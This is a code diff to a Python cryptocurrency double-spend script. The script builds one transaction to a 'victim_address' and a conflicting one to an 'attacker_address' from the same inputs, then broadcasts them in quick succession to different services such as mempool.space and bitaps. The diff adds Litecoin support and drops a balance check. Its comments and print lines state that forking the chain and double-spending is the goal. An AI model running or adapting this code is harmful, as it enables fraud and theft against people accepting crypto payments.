@@ -6,9 +6,11 @@ import cryptos
 import subprocess
 import json
 import litecoin.rpc
+import hashlib
+import uuid
+
+from bitcoinaddress import Wallet
 from litecoinutils.keys import PrivateKey
-
-
 from bitcoincli import Bitcoin
 from bs4 import BeautifulSoup
 
@@ -63,12 +65,28 @@ def broadcast_mempool_space(raw_tx, testnet):
     if testnet:
         url = "https://mempool.space/testnet/api/tx"
     
+    if coin_symbol == "ltc":
+        url = "https://litecoinspace.org/api/tx"
+        if testnet:
+            url = "https://litecoinspace.org/testnet/api/tx"
+
+
     response = requests.post(url, data=payload, headers=headers)
     print(response.text)
     if response.status_code == 200:
         print("Transaction successfully broadcasted!")
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
+
+def send_rawtransaction(tx_data, testnet):
+    payload = {"jsonrpc":"1.0","id":"1","method":"sendrawtransaction","params":[tx_data]}
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    url     = f"https://api.bitaps.com/{coin_symbol}/native/"
+    if testnet:
+        url = f"https://api.bitaps.com/{coin_symbol}/testnet/native/"
+    result  = requests.post(url, data=payload, headers=headers)
+    print(result)
+    print(result.status_code)
 
 args = parser.parse_args()
 fake_send_from   = args.from_wifkey
@@ -101,14 +119,10 @@ print(balance)
 
 send_amount = to_satoshi(amount_btc)
 
-#if balance < send_amount:
-#    print(f"[!] insufficient funds. ")
-#    exit()
-#
+print(inputs)
 
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
-
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 
@@ -145,10 +159,17 @@ print()
 time.sleep(1) #詠唱中.... -o-
 print("FRK BC EXE DSPND (ブロックチェーンを分岐、 二重払いを実行!)")
 time.sleep(1) 
-broadcast_transaction(tx_victim, testnet)
-time.sleep(0.7) # >>>> FRK BC EXE DSPND 0w0
+if coin_symbol == "btc":
+    broadcast_transaction(tx_victim, testnet)
+else:
+    send_rawtransaction(tx_victim, testnet)
+
+# >>>> FRK BC EXE DSPND 0w0
+broadcast_mempool_space(tx_attacker, testnet)
 print()
-broadcast_mempool_space(block, testnet) #異なるサービスに素早く送ることが重要。
+input("--- READY... --- ")
+#transaction_util.pushtx(block) #異なるサービスに素早く送ることが重要。
+broadcast_mempool_space(block, testnet)
 print()
 print()
 
